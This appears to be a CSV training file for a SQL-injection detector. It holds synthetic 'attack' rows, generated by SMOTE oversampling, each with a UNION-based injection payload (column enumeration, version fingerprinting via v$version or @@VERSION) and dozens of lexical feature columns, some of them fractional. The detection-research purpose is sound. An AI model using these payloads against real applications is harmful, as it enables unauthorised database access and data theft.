id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000096,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000123,0.05610016890558434,56.379963348763965,20.0,3.7350062662652896,14.0,28.303970679011172,4.0,10.075992669752793,0.24844277316080343,0.5018686722070358,0.07098364947451526,0.17870490515764542,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,5.075992669752792,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000097,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000099,0.333933096822722,67.47059474258845,19.49411894851769,3.523636474639436,14.0,37.97647579407076,4.0,11.49411894851769,0.2084313508580385,0.5617927418765274,0.059551814530868136,0.17022409273456593,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,7.49411894851769,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000098,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000005,0.178646169700795,101.67558527732777,26.0,4.071610388270091,64.2341137031037,4.882943148448149,23.558528425775926,9.0,0.631604377001558,0.04817871875542218,0.2316810078834033,0.0885358963596165,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000099,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000167,0.1920584375057847,75.90259082339608,19.0,3.514827299392441,54.12207265871686,1.0,11.0,9.780518164679215,0.7105593436103845,0.013551614604487172,0.14906776064935914,0.12682128113576915,1.0,0.0,2.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,5.780518164679216,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000100,attack,union," select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000068,1.5059490508729356,112.81802466649924,27.0,3.8676622772567932,63.23964084845441,5.239640848454407,34.71892254536322,9.619820424227203,0.5614162554921154,0.046132061866648144,0.3071961800634595,0.085255502577777,0.0,0.0,2.0,0.0,1.0,2.619820424227204,0.0,2.0,0.0,0.0,1.0,5.619820424227203,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.6198204242272037,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.619820424227203
SMOTE_000101,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R000232,1.4625012890034146,75.05972043592445,27.029860217962227,3.9747065480363455,25.0,24.1194408718489,18.910419346113322,7.029860217962225,0.3333049260099428,0.3201431729098881,0.25318391081229935,0.09336799026786974,0.5149301089811128,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.485069891018887,0.0,0.0,2.0298602179622254,2.0,0.5149301089811127,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000102,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000168,0.5694705582296515,65.50059789099583,22.26474105241152,3.8487618763655598,14.0,30.117928419292156,9.588446314469117,11.794223157234558,0.21626557997605264,0.45968408840456876,0.14394502775423484,0.18010530386514376,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.2647410524115195,1.0,0.0,5.529482104823039,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000103,attack,union," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000002,2.6096218454869,92.299543565669,26.712557054291374,3.80874510431418,42.0,5.0,31.299543565669,14.0,0.4557164592111,0.054251959429892804,0.3381260949553072,0.1519054864037,3.0,0.0,2.0,0.7125570542913746,1.0,2.0,0.0,2.5748858914172508,0.0,0.0,1.0,7.137671162874124,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.7125570542913746,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000104,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,0.14517611355310425,82.02712446648766,27.0,4.014010040206913,25.0,31.221699573190136,16.0,9.805424893297534,0.30521899460930985,0.3800186634175897,0.19534015654995832,0.1194221854231422,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,3.8054248932975336,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000105,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000004,1.2722804206165497,74.62805177785634,32.37194822214366,4.392572174978669,41.256103555712684,3.0,17.371948222143658,13.0,0.5527620886501774,0.04020105309305061,0.23283229485355256,0.17420456340321938,3.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.6280517778563407,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.62805177785634
SMOTE_000106,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000186,0.33820535752345976,80.33975705496452,21.489317136997634,3.698398546701003,14.0,37.87180564397162,14.0,14.467951410992905,0.17578508736464768,0.4685195495409501,0.17578508736464768,0.17991027572975454,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.0,1.0,0.0,7.467951410992904,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000107,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000076,0.4399573981157707,80.60783862069283,25.80046109533487,3.9624106459339195,25.0,26.403688762678982,20.802766572009233,8.401383286004616,0.3126872840232195,0.3263842172504682,0.25729565429877993,0.1036328444275324,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.8004610953348723,0.0,0.0,2.600922190669745,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000108,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000302,0.22987307233501472,85.1039099716993,27.441563988679718,4.157160807798637,29.0,28.883127977359432,15.0,12.220781994339859,0.3409559404522098,0.3391216253197715,0.1763565209235568,0.1435659133044618,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,3.2207819943398586,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000109,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000234,1.6463602345172736,71.0,28.061833420269423,4.162189973615004,27.123666840538846,21.876333159461154,15.469083289865289,6.530916710134711,0.3820234766273077,0.3081173684431148,0.2178744125333139,0.09198474239626353,0.5309167101347113,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,1.4690832898652886,2.5309167101347114,0.5309167101347113,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.5309167101347114,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5309167101347114
SMOTE_000110,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R000091,0.2708460755897704,97.28922510872904,28.0,4.157379890739732,29.0,40.0,15.0,13.289225108729045,0.2980956442618825,0.4111664058784586,0.15418740220442198,0.13655054765523686,1.2892251087290443,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,6.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000111,attack,union,"-9953'||  (  select 'zljk' where 2886  =  2886 union all select 2886,2886,2886,2886,2886,2886,2886,2886,2886,2886#",nearest_attack_euclidean,R000285,0.048295584378337676,114.23994652354497,29.976005347645504,3.9609925581835994,29.191957218835984,52.0,15.047989304708997,18.0,0.25544175677451175,0.4552576953010513,0.1317113457048423,0.15758920221959466,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,9.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.02399465235449799,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.023994652354498
SMOTE_000112,attack,union,"-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#",nearest_attack_euclidean,R000179,0.3624059578550132,91.39679314880155,31.65290575317354,4.454271944431491,37.0,25.917434519041233,17.0,11.47935862976031,0.4065874836378054,0.28132623708906984,0.1868104654552079,0.12527581381791683,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,2.479358629760309,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000113,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000194,0.4070295116533968,57.63502077973051,19.472995844053898,3.7144456104969286,14.0,30.10801662378441,4.0,9.527004155946102,0.2433665785102342,0.5218667674168752,0.0695333081457812,0.1652333459271094,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,5.527004155946102,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000114,attack,union," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000057,0.0,75.0,33.0,4.423445153667222,42.0,3.0,17.0,13.0,0.56,0.03999999999999998,0.22666666666666666,0.17333333333333334,3.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000115,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R000301,0.3110871554799255,88.60661046085377,28.26966947695731,4.222929385116303,29.0,31.68528836868302,15.0,12.921322092170755,0.3309960173426165,0.3525846937989459,0.1712048365565258,0.14521445230191174,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,3.9213220921707546,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000116,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000113,0.8791923001989742,83.80965417091514,29.17462055612202,4.296122955830014,33.698482224488075,22.349241112244037,16.17462055612202,11.58731027806101,0.4010231401303802,0.26666666666666666,0.19347433024376656,0.13883586295918654,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,1.5873102780610098,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.5873102780610097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.587310278061009
SMOTE_000117,attack,union,"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",nearest_attack_euclidean,R000181,0.019042725412904617,99.91786032760493,29.976531522172838,4.091546313090642,25.0,40.0,21.929594566518514,12.988265761086419,0.2502208055709545,0.40035328891352717,0.219437261230596,0.12998864428492235,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.988265761086419,0.0,0.0,6.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000009,0.16858785809263652,83.0,28.61482330206729,3.98527194224334,43.0,3.0,25.0,12.0,0.5180722891566265,0.03614457831325302,0.30120481927710846,0.14457831325301204,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.3851766979327098,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000119,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000219,0.8309025840185028,88.1521856643482,23.0,3.760953429092259,25.0,36.921748531478556,16.0,10.230437132869639,0.2855412821713974,0.41623251676164186,0.18274642058969437,0.11547978047726637,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.230437132869638,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000120,attack,union,"-8355%""   )    )     )   union all select 3004,3004,3004,3004,3004,3004,3004--",nearest_attack_euclidean,R000292,0.18497891780367462,78.44389220142732,21.177556880570926,3.642442224366286,14.0,32.7102275222837,17.64488623885815,14.088778440285463,0.17852726431572716,0.4166192765357514,0.22525657507031882,0.17959688407820262,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.9112215597145377,1.0,0.0,6.177556880570926,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000012,1.208580673624142,99.5922613022904,26.0,4.04098467498335,62.0,5.0,24.0,8.592261302290392,0.6225535150765653,0.05020592863520684,0.240988457448993,0.08625209883923492,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.592261302290392,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.5922613022903916,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000122,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000141,0.023331095023647608,49.969425351242776,22.0,4.102449880549555,14.0,23.975540280994224,4.0,7.993885070248556,0.28019024225893385,0.4797825802755042,0.08005435493112394,0.15997282253443804,0.9938850702485558,0.006114929751444231,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,3.993885070248556,1.0,0.9938850702485558,0.006114929751444231,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000123,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000060,1.314295732036693,73.75702169398706,31.378510846993528,4.35456705058187,44.0,2.378510846993528,17.0,10.378510846993526,0.5966558987149899,0.032167533962110195,0.230526142685337,0.1406504246375629,0.0,0.0,2.0,0.0,1.6214891530064737,1.0,0.0,1.1102230246251565e-16,0.3785108469935263,0.0,1.0,5.378510846993526,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000124,attack,union,"-1949  )   as smyn where 4066  =  4066 union all select 4066,4066--",nearest_attack_euclidean,R000131,0.5214895550622757,71.02079095833002,25.236517115195884,3.9867774150143496,25.0,21.892136921567072,17.419102691175304,6.709551345587652,0.3552736720045752,0.3067443771461253,0.244269229739777,0.09371272110952247,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.236517115195884,0.0,0.0,1.4730342303917685,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000125,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000143,0.020884878238233893,98.08280432732937,27.0,4.015690517565947,25.0,44.0,16.07097513771089,13.011829189618481,0.2549008641221347,0.448625520854957,0.16381250673065081,0.13266110829225747,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.011829189618481,0.0,0.0,7.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000126,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000028,1.1471686681176927,102.0,27.553495491682973,4.155328190260293,62.0,4.223252254158513,23.223252254158513,12.553495491682972,0.6078431372549019,0.041404433864299206,0.22767894366822072,0.12307348521257816,3.0,1.5534954916829724,2.0,0.0,1.2232522541585138,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.0,1.0,0.7767477458414862,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000127,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000037,0.3014905445709822,99.0,25.854803500184463,4.025907253834759,62.0,5.0,24.0,8.0,0.6262626262626263,0.0505050505050505,0.24242424242424243,0.08080808080808083,0.0,0.0,2.0,0.0,1.1451964998155382,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
